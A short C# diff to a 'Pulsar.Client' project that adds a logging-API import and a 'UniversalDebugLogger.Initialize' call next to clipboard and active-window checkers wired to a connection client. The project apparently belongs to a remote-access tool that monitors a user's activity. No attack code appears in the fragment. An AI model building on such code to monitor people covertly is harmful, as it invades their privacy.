@@ -1,6 +1,7 @@
 ﻿using Pulsar.Client.Anti;
 using Pulsar.Client.Config;
 using Pulsar.Client.Logging;
+using Pulsar.Client.LoggingAPI;
 using Pulsar.Client.Messages;
 using Pulsar.Client.Networking;
 using Pulsar.Client.Setup;
@@ -149,6 +150,7 @@ namespace Pulsar.Client
                 _activeWindowChecker = new ActiveWindowChecker(_connectClient);
                 _clipboardChecker = new ClipboardChecker(_connectClient);
                 _debugLog = new DebugLog(_connectClient);
+                UniversalDebugLogger.Initialize(_connectClient);
 
                 new Thread(() =>
                 {
